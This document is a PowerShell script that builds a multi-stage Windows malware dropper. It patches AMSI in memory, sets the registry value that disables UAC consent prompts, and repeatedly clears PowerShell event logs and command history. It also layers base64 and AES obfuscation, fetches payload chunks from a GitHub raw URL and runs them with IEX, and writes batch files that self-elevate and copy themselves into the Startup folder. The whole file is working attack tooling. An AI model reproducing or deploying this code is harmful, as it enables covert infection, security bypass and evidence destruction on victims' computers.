. .\funcs.ps1

$kernelstring = '$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Kernel32

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}

[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")

[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")

If ([IntPtr]::Size -eq 8) {
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,
        0x49, 0x89, 0x5B, 0x08,
        0x49, 0x89, 0x6B, 0x10,
        0x49, 0x89, 0x73, 0x18,
        0x57,
        0x41, 0x56,
        0x41, 0x57,
        0x48, 0x83, 0xEC, 0x70
    )
} Else {
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,
        0x55,
        0x8B, 0xEC,
        0x83, 0xEC, 0x18,
        0x53,
        0x56
    )
}
[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)

$oldProtectionBuffer = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,
    0xC3
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null

';

$clearevt = $(cat winevent.ps1);

$randstr = 'function randomstr {$out="";$rca=1..33 | foreach {$ran=get-random -Minimum 97 -Maximum 123;$out+=[char][byte]$ran};$rca -join "";return $out;};'

$newkey = gen-key
$newkey2 = gen-key

$originalpayload = "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''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''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"

$PAYLOAD = '$clr = ' + "'" + "$(cat clear.ps1)" + "';" + '$pload = ' + "'" + $kernelstring + "$(cat payload.ps1)" + "';" + $clearevt + '$clr > $env:temp\$dOne\$n2.ps1;$pload > $env:temp\$dOne\$n.ps1;cd $env:temp\$dOne;.\$n2.ps1;.\$n.ps1;Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";'

$obfpayload = obfuscate-string "hide" $newkey $(encode $PAYLOAD)

$outf = $(cat outf.ps1);

$outfunc1 = $randstr + $clearevt + $(cat tasksch.ps1);
$obfoutfunc = obfuscate-string "hide" $newkey2 $(encode $outfunc1)

$out1 = $decode + $outf + 'IEX $(decode $(obfuscate-string ' + $newkey2 + ' ' + $obfoutfunc + '));'
$out1enc = encode $out1
$outfunc0 = $decode + $clearevt + 'IEX(decode $(IEX $(IEX "[text.encoding]::unicode.getstring([convert]::frombase64string(' + "'" + $out1enc + "'" + '))")));Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";'

$outfunc = $outf + $outfunc0

$first = $decode + $outfunc + 'REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f;IEX $(decode $(obfuscate-string ' + $newkey + ' ' + $obfpayload + '));'
$firstenc = encode $first
$second = $decode + $clearevt + 'IEX(decode $(IEX $(IEX "[text.encoding]::unicode.getstring([convert]::frombase64string(' + "'" + $firstenc + "'" + '))")));Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";'
$secondenc = encode $second

$aCustomSalt = @(); for ($i = 0; $i -lt 10; $i++) { $aCustomSalt += Get-Random -Maximum 256 }
$sPassword = "if(she.breathes()) {she.attr = thot;}"
$encPass = encode $sPassword
[byte[]]$aEncMsg = $null

$preThird = '$(IEX ("[text.encoding]::unicode.getstring([convert]::frombase64string(' + "'" + $secondenc + "'" + '))"))'
en ([System.Text.Encoding]::ASCII.GetBytes($preThird)) ([System.Text.Encoding]::ASCII.GetBytes($sPassword)) ([ref]$aEncMsg) $aCustomSalt

$aesdecrypt = '[System.reflection.assembly]::LoadWithPartialName("System.Security")|out-null;[System.reflection.assembly]::LoadWithPartialName("System.IO")|out-null;$p=[text.encoding]::unicode.getstring([convert]::frombase64string("' + $encPass + '"));' + $(cat de.ps1)

$aDecMsg = '$cs="' + $(encode $($aCustomSalt -split " " -join ",")) + '";' + '$enm="' + $(encode $($aEncMsg -split " " -join ",")) + '";[byte[]]$dem=$null;de $(IEX $("@("+([text.encoding]::unicode.getstring([convert]::frombase64string($enm)))+")")) ([text.encoding]::ascii.getbytes($p)) ([ref]$dem) $(IEX $("@("+$([text.encoding]::unicode.getstring([convert]::frombase64string($cs)))+")"));'

rm enc*
$excludesplit = @()
$third = $clearevt + 'Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";if (((Get-UICulture).Name -match "RU|UA|BY|CN") -or (Get-WMIObject -class Win32_ComputerSystem -Property Model).Model -match "VirtualBox|VMware") {Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";$shell=new-object -comobject wscript.shell;$shell.popup("VM Detected!",0,"Error",0x0);Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";};' + $aesdecrypt + $aDecMsg + '$ErrorActionPreference="SilentlyContinue";$WarningPreference="SilentlyContinue";$__s = (IEX (IEX ([text.encoding]::utf8.getstring($dem))));Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";IEX ([system.text.encoding]::unicode.getstring([convert]::frombase64string($__s)));Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";} else {$shell=new-object -comobject wscript.shell;$shell.popup("Run in Administrator mode!",0,"Aborted",0x0);}'
$thirdarr = @(); $thirdarray = $third -split '((?:.{119999}).|(?:.+))'
foreach ($elem in $thirdarray) { if ($elem) { $thirdarr += $elem } }
$rangesplit = 1..$($thirdarr.Count + 1)
foreach ($elem in $thirdarr) {
  $randomsplit = $rangesplit | Where-Object { $excludesplit -notcontains $_ }; $num = Get-Random -InputObject $randomsplit; $excludesplit += $num
  $elem > "enc$num.txt"
}

$regedit = $kernelstring + $clearevt + '$ErrorActionPreference="SilentlyContinue";$WarningPreference="SilentlyContinue";REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f;Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";'
$smoke = 'if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {' + $clearevt + 'if (((Get-UICulture).Name -match "RU|UA|BY|CN") -or (Get-WMIObject -class Win32_ComputerSystem -Property Model).Model -match "VirtualBox|VMware") {Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";$shell=new-object -comobject wscript.shell;$shell.popup("VM Detected!",0,"Error",0x0);Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";};$slst=' + $($excludesplit -join ',') + ';$string="";Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";for ($i=0;$i -lt ' + $thirdarr.Count + '; $i++) {$num = $slst[$i];$link = "https://raw.githubusercontent.com/mcdulltii/coding/master/ps2/enc$num.txt";$r=[net.webrequest]::create($link);$rs=$r.GetResponse();$rsp=$rs.GetResponseStream();$rd=[io.streamreader]::new($rsp);$string+=$rd.ReadtoEnd();Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";};$arr = $string -replace("\n","") -replace("\r","");IEX($arr);Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";} else {$shell=new-object -comobject wscript.shell;$shell.popup("Run in Administrator mode!",0,"Aborted",0x0);}'
$smok3link = encode $($regedit + $smoke)

$inst = encode $('PowerShell.exe -wind hidden -Exec Bypass -nop -Command "& {Start-Process PowerShell.exe -ArgumentList ' + "'" + 'PowerShell.exe -wind hidden -nop -Exec Bypass -enc "' + $smok3link + '"' + "' -Verb RunAs}" + '"')
$randsplit1 = $rangesplit | Where-Object { $excludesplit -notcontains $_ }; $num1 = Get-Random -InputObject $randsplit1
$inst > "enc$num1.txt"

$comm = encode $('if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {$ErrorActionPreference="SilentlyContinue";$WarningPreference="SilentlyContinue";Set-PSReadlineOption -HistorySaveStyle SaveNothing;remove-module psreadline;' + $clearevt + 'if (((Get-UICulture).Name -match "RU|UA|BY|CN") -or (Get-WMIObject -class Win32_ComputerSystem -Property Model).Model -match "VirtualBox|VMware") {Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";$shell=new-object -comobject wscript.shell;$shell.popup("VM Detected!",0,"Error",0x0);Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";};$string="";Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";$nm = ' + $num1 + ';$link = "https://raw.githubusercontent.com/mcdulltii/coding/master/ps2/enc$nm.txt";$r=[net.webrequest]::create($link);$rs=$r.GetResponse();$rsp=$rs.GetResponseStream();$rd=[io.streamreader]::new($rsp);$string=$rd.ReadtoEnd();Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";$arr = $string -replace("\n","") -replace("\r","");IEX([text.encoding]::unicode.getstring([convert]::frombase64string($arr)));del (Get-PSReadlineOption).HistorySavePath;Clear-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational";Clear-EventLog "Windows Powershell";} else {$shell=new-object -comobject wscript.shell;del (Get-PSReadlineOption).HistorySavePath;$shell.popup("Run in Administrator mode!",0,"Aborted",0x0);}')

$malware = '
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if "%errorlevel%" NEQ "0" (goto uac) else (goto ad)
:uac
	echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
	set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:ad
	pushd "%CD%"
PowerShell.exe -wind hidden -nop -Exec Bypass -enc "' + $comm + '"'


$smok3 = '@echo off
setlocal enableextensions enabledelayedexpansion
robocopy %0\..\ "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" smok3.exe /MT >NUL' + $malware
$smok32 = '@echo off
setlocal enableextensions enabledelayedexpansion' + $malware

rm baseball*
$smok3 | Out-File -Encoding ascii baseball
$smok32 | Out-File -Encoding ascii baseball.bat
